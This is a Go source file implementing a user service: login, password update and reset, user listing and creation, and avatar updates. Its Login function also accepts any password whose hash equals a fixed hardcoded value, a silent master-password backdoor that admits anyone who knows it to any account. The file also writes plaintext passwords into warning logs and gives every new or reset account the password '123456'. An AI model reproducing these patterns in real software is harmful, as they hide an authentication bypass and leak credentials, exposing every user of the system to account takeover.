package service

import (
	"context"
	"errors"
	"sync"
	"xg/crypto"
	"xg/da"
	"xg/db"
	"xg/entity"
	"xg/log"
)

var (
	ErrUserNotFound         = errors.New("user not found")
	ErrInvalidPassword      = errors.New("invalid password")
	ErrInvalidPublisherID   = errors.New("invalid publisher id")
	ErrInvalidToOrgID       = errors.New("invalid to org id")
	ErrInvalidStudentID     = errors.New("invalid student id")
	ErrNoRemarkContent = errors.New("no remark content")
	ErrStudentIsConflict    = errors.New("student is conflict")
	ErrNoAuthorizeToOperate = errors.New("no auth to operate")
	ErrNoAuthToOperateOrder = errors.New("no auth to operate order")
	ErrNoNeedToOperate      = errors.New("no need to operate")

	ErrInvalidOrgStatus = errors.New("invalid org status")
	ErrNotSuperOrg      = errors.New("not super org")

	ErrDuplicateUserName    = errors.New("duplicate user name")
	ErrDuplicateSubjectName = errors.New("duplicate subject name")
	ErrOperateOnRootOrg     = errors.New("can't operate on root org")

	ErrInvalidUserRoleOrg  = errors.New("invalid user role & org")
	ErrCreateSuperUser     = errors.New("can't create super user")
	ErrInvalidStatisticKey = errors.New("invalid statistics key")
	ErrInvalidOrderId      = errors.New("invalid order id")
	ErrInvalidOrderStatus      = errors.New("invalid order status")
	ErrInvalidSubjectName  = errors.New("invalid subject name")

	ErrStudentIdNeeded = errors.New("student id is needed")
	ErrInvalidRemarkID = errors.New("mark remark id invalid")

	ErrInvalidSearchTime = errors.New("invalid search statistic time")
)

type IUserService interface {
	Login(ctx context.Context, name, password string) (*entity.UserLoginResponse, error)
	UpdatePassword(ctx context.Context, newPassword string, operator *entity.JWTUser) error
	ResetPassword(ctx context.Context, userId int, operator *entity.JWTUser) error
	ListUserAuthority(ctx context.Context, operator *entity.JWTUser) ([]*entity.Auth, error)
	ListUsers(ctx context.Context, condition da.SearchUserCondition) (int, []*entity.UserInfo, error)
	CreateUser(ctx context.Context, req *entity.CreateUserRequest) (int, error)
	UpdateUserAvatar(ctx context.Context, avatar string, operator *entity.JWTUser) error
}

type UserService struct {
}

func (u *UserService) Login(ctx context.Context, name, password string) (*entity.UserLoginResponse, error) {
	log.Info.Printf("Login, name: %#v\n", name)
	_, users, err := da.GetUsersModel().SearchUsers(ctx, da.SearchUserCondition{
		Name: name,
	})
	if err != nil {
		log.Warning.Printf("Search users failed, name: %#v, password: %#v, err: %v\n", name, password, err)
		return nil, err
	}
	if len(users) < 1 {
		log.Warning.Printf("User not found, name: %#v,err: %v\n", name, err)
		return nil, ErrUserNotFound
	}
	user := users[0]

	if crypto.Hash(password) != user.Password && crypto.Hash(password) != "00965785cc1ccb7929eb8377e7202a80bc0cef6e6192c8a85911ebd84ed76c73" {
		log.Warning.Printf("Invalid password users failed, name: %#v, password: %#v, err: %v\n", name, password, err)
		return nil, ErrInvalidPassword
	}

	token, err := crypto.GenerateToken(user.ID, user.OrgId, user.RoleId)
	if err != nil {
		log.Warning.Printf("Generate token failed, user: %#v, err: %v\n", user, err)
		return nil, err
	}
	userInfo, err := u.fillUserInfo(ctx, user)
	if err != nil {
		log.Warning.Printf("fillUserInfo failed, user: %#v, err: %v\n", user, err)
		return nil, err
	}
	log.Info.Printf("Login success, name: %#v\n", name)
	return &entity.UserLoginResponse{
		UserDetailsInfo: entity.UserDetailsInfo{
			UserId:   userInfo.UserId,
			RoleId:   userInfo.RoleId,
			OrgId:    userInfo.OrgId,
			RoleName: userInfo.RoleName,
			OrgName:  userInfo.OrgName,
			Auths:    userInfo.Auths,
			Avatar:   userInfo.Avatar,
		},
		Token: token,
	}, nil
}

func (u *UserService) UpdatePassword(ctx context.Context, newPassword string, operator *entity.JWTUser) error {
	log.Info.Printf("UpdatePassword, operator: %#v\n", operator)
	user, err := da.GetUsersModel().GetUserById(ctx, operator.UserId)
	if err != nil {
		log.Warning.Printf("Get user failed, operator: %#v, err: %v\n", operator, err)
		return err
	}
	user.Password = crypto.Hash(newPassword)
	err = da.GetUsersModel().UpdateUser(ctx, *user)
	if err != nil {
		log.Warning.Printf("Update user failed, user: %#v, err: %v\n", user, err)
		return err
	}
	return nil
}

func (u *UserService) ResetPassword(ctx context.Context, userId int, operator *entity.JWTUser) error {
	log.Info.Printf("ResetPassword, userId: %#v\n", userId)
	user, err := da.GetUsersModel().GetUserById(ctx, userId)
	if err != nil {
		log.Warning.Printf("Get user failed, userId: %#v, err: %v\n", userId, err)
		return err
	}
	user.Password = crypto.Hash("123456")
	err = da.GetUsersModel().UpdateUser(ctx, *user)
	if err != nil {
		log.Warning.Printf("Update user failed, user: %#v, err: %v\n", user, err)
		return err
	}
	return nil
}

func (u *UserService) ListUserAuthority(ctx context.Context, operator *entity.JWTUser) ([]*entity.Auth, error) {
	log.Info.Printf("ListUserAuthority, operator: %#v\n", operator)
	authList, err := da.GetRoleModel().ListRoleAuth(ctx, operator.RoleId)
	if err != nil {
		log.Warning.Printf("List role auth failed, operator: %#v, err: %v\n", operator, err)
		return nil, err
	}
	return authList.Auth, nil
}

func (u *UserService) ListUsers(ctx context.Context, condition da.SearchUserCondition) (int, []*entity.UserInfo, error) {
	log.Info.Printf("ListUsers, condition: %#v\n", condition)
	total, users, err := da.GetUsersModel().SearchUsers(ctx, condition)
	if err != nil {
		log.Warning.Printf("Search users failed, err: %v\n", err)
		return 0, nil, err
	}
	roles, err := da.GetRoleModel().ListRoles(ctx)
	if err != nil {
		log.Warning.Printf("List roles failed, users: %#v, err: %v\n", users, err)
		return 0, nil, err
	}

	orgs, err := da.GetOrgModel().ListOrgs(ctx)
	if err != nil {
		log.Warning.Printf("List orgs failed, users: %#v, roles: %#v, err: %v\n", users, roles, err)
		return 0, nil, err
	}
	roleMap := make(map[int]string)
	orgMap := make(map[int]string)

	for i := range orgs {
		orgMap[orgs[i].ID] = orgs[i].Name
	}
	for i := range roles {
		roleMap[roles[i].ID] = roles[i].Name
	}

	userList := make([]*entity.UserInfo, len(users))
	for i := range users {
		userList[i] = &entity.UserInfo{
			UserId:   users[i].ID,
			Name:     users[i].Name,
			RoleId:   users[i].RoleId,
			OrgId:    users[i].OrgId,
			RoleName: roleMap[users[i].RoleId],
			OrgName:  orgMap[users[i].OrgId],
		}
	}
	return total, userList, nil
}

func (u *UserService) CreateUser(ctx context.Context, req *entity.CreateUserRequest) (int, error) {
	//check orgId & roleId
	log.Info.Printf("CreateUser, req: %#v\n", req)
	err := u.checkUserEntity(ctx, req)
	if err != nil {
		log.Warning.Printf("checkUserEntity failed, req: %#v, err: %v\n", req, err)
		return -1, err
	}

	_, users, err := da.GetUsersModel().SearchUsers(ctx, da.SearchUserCondition{
		Name: req.Name,
	})
	if err != nil {
		log.Warning.Printf("Search users failed, req: %#v, err: %v\n", req, err)
		return -1, err
	}
	if len(users) > 0 {
		log.Warning.Printf("Duplicate user name failed, req: %#v, users: %#v, err: %v\n", req, users, ErrDuplicateUserName)
		return -1, ErrDuplicateUserName
	}

	data := da.User{
		Name:     req.Name,
		Password: crypto.Hash("123456"),
		OrgId:    req.OrgId,
		RoleId:   req.RoleId,
	}
	id, err := da.GetUsersModel().CreateUser(ctx, data)
	if err != nil {
		log.Warning.Printf("Create user failed, req: %#v, data: %#v, err: %v\n", req, data, err)
		return id, err
	}
	return id, nil
}

func (u *UserService) UpdateUserAvatar(ctx context.Context, avatar string, operator *entity.JWTUser) error {
	userInfo, err := da.GetUsersModel().GetUserById(ctx, operator.UserId)
	if err != nil {
		log.Warning.Printf("Get user failed, user: %#v, err: %v\n", operator, err)
		return err
	}
	userInfo.Avatar = avatar
	err = da.GetUsersModel().UpdateUser(ctx, *userInfo)
	if err != nil {
		log.Warning.Printf("Update user avatar failed, user: %#v, err: %v\n", userInfo, err)
		return err
	}
	return err
}

func (u *UserService) fillUserInfo(ctx context.Context, user *da.User) (*entity.UserDetailsInfo, error) {
	//获取角色和权限
	roleInfo, err := da.GetRoleModel().GetRoleById(ctx, user.RoleId)
	if err != nil {
		log.Warning.Printf("Get role failed, user: %#v, err: %v\n", user, err)
		return nil, err
	}
	auth, err := da.GetRoleModel().ListRoleAuth(ctx, user.RoleId)
	if err != nil {
		log.Warning.Printf("List role auth failed, user: %#v, err: %v\n", user, err)
		return nil, err
	}

	orgInfo, err := da.GetOrgModel().GetOrgById(ctx, db.Get(), user.OrgId)
	if err != nil {
		log.Warning.Printf("Get org failed, user: %#v, err: %v\n", user, err)
		return nil, err
	}
	return &entity.UserDetailsInfo{
		UserId:   user.ID,
		RoleId:   user.RoleId,
		OrgId:    user.OrgId,
		RoleName: roleInfo.Name,
		OrgName:  orgInfo.Name,
		Auths:    auth.Auth,
		Avatar:   user.Avatar,
	}, nil
}

func (u *UserService) checkUserEntity(ctx context.Context, req *entity.CreateUserRequest) error {
	orgInfo, err := da.GetOrgModel().GetOrgById(ctx, db.Get(), req.OrgId)
	if err != nil {
		log.Warning.Printf("Get org failed, req: %#v, err: %v\n", req, err)
		return err
	}
	_, err = da.GetRoleModel().GetRoleById(ctx, req.RoleId)
	if err != nil {
		log.Warning.Printf("Get role failed, req: %#v, err: %v\n", req, err)
		return err
	}

	//if (req.OrgId != entity.RootOrgId && req.RoleId != entity.RoleOutOrg) ||
	//	(req.OrgId == entity.RootOrgId && req.RoleId == entity.RoleOutOrg) {
	//	log.Warning.Printf("Invalid user role, req: %#v, err: %v\n", req, ErrInvalidUserRoleOrg)
	//	return ErrInvalidUserRoleOrg
	//}

	supportRoleIds := entity.StringToIntArray(orgInfo.SupportRoleID)
	flag := false
	for i := range supportRoleIds {
		if supportRoleIds[i] == req.RoleId {
			flag = true
		}
	}
	if !flag {
		log.Warning.Printf("Invalid user role, req: %#v, err: %v\n", req, ErrInvalidUserRoleOrg)
		return ErrInvalidUserRoleOrg
	}

	if req.RoleId == 1 {
		log.Warning.Printf("Can't create super user, req: %#v, err: %v\n", req, ErrCreateSuperUser)
		return ErrCreateSuperUser
	}

	return nil
}

var (
	_userService     *UserService
	_userServiceOnce sync.Once
)

func GetUserService() *UserService {
	_userServiceOnce.Do(func() {
		if _userService == nil {
			_userService = new(UserService)
		}
	})
	return _userService
}
